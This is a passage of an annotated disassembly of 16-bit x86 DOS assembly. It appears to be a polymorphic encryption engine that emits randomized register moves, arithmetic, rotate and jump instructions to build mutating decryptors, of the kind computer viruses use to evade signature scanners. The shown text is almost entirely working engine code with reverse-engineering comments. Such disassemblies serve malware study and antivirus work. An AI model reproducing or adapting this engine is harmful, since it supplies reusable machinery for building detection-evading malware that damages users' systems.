		mov	ah, (reg_set_enc - 14Ch)[bx+si]
		or	ah, ah
		jz	short pick_loop
		dec	bx
		jnz	short double_ref
		pop	bx
		push	bx
		xor	bh, bh
		mov	ah, ops[bx]
		or	ah, ah
		js	short pick_loop

double_ref:
		call	emit_mov

mark_reg_used:
		xchg	ax, bx
		inc	(reg_set_enc - 14Ch)[bx+si]

push_instead:
		mov	dh, bl

store_data_reg:
		pop	bx
		push	dx
		call	emit_ops
		call	emit_mov_data	; load reg al with val bp
		pop	dx
		pop	ax
		mov	(last_op_flag -	14Ch)[si], 80h ; FF uninit; 80 was imm;	40 sub (need neg); 0 mul; else reg in imm,imm
		cmp	al, 0Ch
		jnz	short op_not_jnz2
		mov	bx, dx
		mov	dx, di
		sub	dx, bx
		mov	[bx-1],	dl	; patch	the jump loc
		jmp	done

op_not_jnz2:
		mov	ch, ah
		push	ax
		or	dl, dl
		jnz	short emit_op

; couldn't find a reg and needed to push.  generate the pop.
		cmp	dh, 80h
		jnz	short didnt_push
		sub	al, 5		; XXX 2	was ror	here, 5	was shr, 9 was rol
		cmp	al, 4
		mov	al, 1		; cx
		jb	short emit_pop	; rotate or shift?
		inc	ax		; pop dx then

emit_pop:
		mov	dh, al
		or	al, 58h
		stosb
		jmp	short emit_op

didnt_push:
		or	dh, dh
		js	short emit_op
		cmp	dh, ops[si]
		jz	short emit_op
		mov	bl, dh
		xor	bh, bh
		dec	(reg_set_enc - 14Ch)[bx+si]

emit_op:
		pop	ax

; al is	the op,	less 2 from the	dec+dec

		mov	bl, 00001011b	; or
		sub	al, 9		; 0xb 11 == or
		jz	short got_op
; less 11
		mov	bl, 00100011b	; and
		dec	ax		; 0xc 12 == and
		jz	short got_op
; less 12
		add	al, 6
		cbw
		jns	short maybe_mul
; less 6
		mov	bl, 00110011b	; 5 == xor
		inc	ax
		jz	short got_op
		mov	bl, 00000011b	; 4 == add
		jp	short got_op
		mov	bl, 2Bh		; 3 == sub

got_op:
		mov	al, (data_reg -	14Ch)[si]
		or	dl, dl
		jnz	short try_optimization
		and	dh, 10000111b
		cmp	bl, 00101011b	; sub?
		jnz	short not_sub
		or	dh, 01000000b	; sub.

not_sub:				; FF uninit; 80	was imm; 40 sub	(need neg); 0 mul; else	reg in imm,imm
		mov	(last_op_flag -	14Ch)[si], dh

j_encode_mrm:				; dh signed -> bl_op_reg_mrm
		call	encode_mrm
		jnb	short j_save_op_done
		or	al, al
		jz	short try_optimization
		inc	bp

try_optimization:
		xor	bl, 00000110b
		push	dx
		inc	dx
		inc	dx
		cmp	dx, 5		; [-2,2]?
		pop	dx
		jnb	short emit_81_ops
		or	ax, ax
		js	short emit_inc_or_dec

; xor x,-1 => not x

		cmp	bl, 00110101b	; xor?
		jnz	short emit_81_ops
		inc	dx
		jnz	short emit_81_ops_d ; restore dx
		mov	dh, al
		mov	al, 2		; 2<<3 is NOT from the 0xf7 series

emit_f7_op:
		mov	bl, 0F7h
		mov	ch, bl
		jmp	short j_encode_mrm

emit_inc_or_dec:
		or	dx, dx
		jns	short emit_inc	; [-2,-1]?
		neg	dx
		xor	bl, 00101000b	; toggle add/sub

emit_inc:				; inc reg
		or	al, 40h
		cmp	bl, 00000101b	; was sub?
		jz	short do_inc
		or	al, 8		; dec reg

do_inc:					; +/- 1
		stosb
		dec	dx
		jz	short j_save_op_done
		stosb			; +/- 2
		jmp	short j_save_op_done

maybe_mul:				; 4<<3 is MUL from the 0xf7 series
		mov	cl, 4
		jnz	short not_mul

emit_mov_dx:
		or	dl, dl
		jz	short do_mul
		mov	ax, 02BAh	; mov dx,imm16
		stosb
		xchg	ax, dx
		stosw

do_mul:
		xchg	ax, cx
		jmp	short emit_f7_op

emit_81_ops_d:				; restore dx
		dec	dx

emit_81_ops:				; add/or/adc/sbb/and/sub/xor/cmp
		or	al, al
		jz	short store_bl_and_dx
		and	bl, 00111000b	; mask off op
		or	al, 11000000b	; set mod to reg
		or	bl, al

; check	if dl sign extended is equal to	dx
		mov	al, dl
		cbw
		xor	ax, dx
		mov	al, 81h
		jnz	short do_imm16
		mov	al, 83h
		stc

do_imm16:
		stosb

store_bl_and_dx:
		xchg	ax, bx
		stosb
		xchg	ax, dx
		stosw
		jnb	short j_save_op_done
		dec	di		; rewind, imm8 op was done

j_save_op_done:
		jmp	short save_op_done

not_mul:
		inc	cx
; al is	off by 6
		cmp	al, 7		; 13 ==	imul
		jz	short emit_mov_dx
		inc	ax
; al is	off by 5
		cmp	al, 4
		pushf
		jnb	short loc_107BD	; >= 9?	(is it shl/shr/or/and)
		sub	al, 2
; al is	off by 7

loc_107BD:
		or	dl, dl
		jnz	short maybe_rol

; emit "mov cl,bl" if dh is 3

		push	ax
		mov	al, 1		; cx/cl
		mov	bl, 8Ah		; mov reg8,reg8
		mov	ch, bl
		cmp	dh, 3
		jz	short do_reg8
		inc	bx		; mov reg16,reg16

do_reg8:
		call	emit_op_mrm
		pop	ax

		popf
		push	ax
		jb	short dont_mask_cl ; will we generate a	shift?
		mov	ax, 1F80h
		test	(is_8086 - 14Ch)[si], ah ; 8086: 0, otherwise 0x20
		jz	short dont_mask_cl
		stosb			; and cl,1Fh
		mov	al, 0E1h	; ""
		stosw			; ""

dont_mask_cl:
		pop	ax

		mov	bl, 0D3h	; rol xx,cl
		mov	dl, 1

emit_bl:
		mov	dh, (data_reg -	14Ch)[si]
		call	bl_op_reg_mrm	; MRM is reg,imm
		xchg	ax, dx
		cmp	bl, 0C1h	; rol xx,imm8
		jz	short arg_is_byte
		shr	al, 1
		jb	short save_op_done
		xchg	ax, bx
		stosb
		xchg	ax, dx

arg_is_byte:
		stosb

save_op_done:
		mov	(last_op - 14Ch)[si], ch

done:
		mov	dh, (data_reg -	14Ch)[si]
		xor	dl, dl
		retn

maybe_rol:				; rol xx,imm8
		mov	bl, 0C1h
		popf
		jnb	short not_byte
		mov	ch, bl
		test	dl, 8
		jz	short not_byte
		neg	dl
		xor	al, 1		; mirror op returned in	al?

not_byte:				; clamp	the rotate amount
		and	dl, 0Fh
		jz	short done
		cmp	dl, 1
		jz	short cant_rol_imm
		cmp	ah, (is_8086 - 14Ch)[si] ; 8086: 0, otherwise 0x20
		jz	short emit_bl

cant_rol_imm:				; rol
		mov	bl, 0D1h
		cmp	dl, 3
		jb	short emit_bl
		push	ax
		mov	al, 0B1h	; mov cl,imm8
		mov	ah, dl
		stosw
		jmp	short dont_mask_cl
emit_ops	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


emit_mov_data	proc near
		mov	al, (data_reg -	14Ch)[si]

emit_mov:				; emit a mov for al=reg, dx=val	(dl=0 is a reg move)
		cbw
		push	ax
		cmp	di, offset encrypt_stage
		jnb	short in_encrypt
		mov	bx, ax
		mov	(reg_set_dec - 14Ch)[bx+si], bh

in_encrypt:
		or	dl, dl
		jnz	short do_mov_imm16
		mov	bl, 8Bh
		call	encode_mrm_dh_s	; skip op if dh	is signed
		jnb	short done

do_mov_imm16:
		or	al, 0B8h
		stosb
		xchg	ax, dx
		stosw

done:
		pop	ax
		retn
emit_mov_data	endp

		public CODE_TOP
CODE_TOP	db 0Bh dup(?)
		db    ?	;
_TEXT		ends

; ===========================================================================

; Segment type:	Zero-length
_DATA		segment	word public 'DATA' use16
_DATA		ends


		end
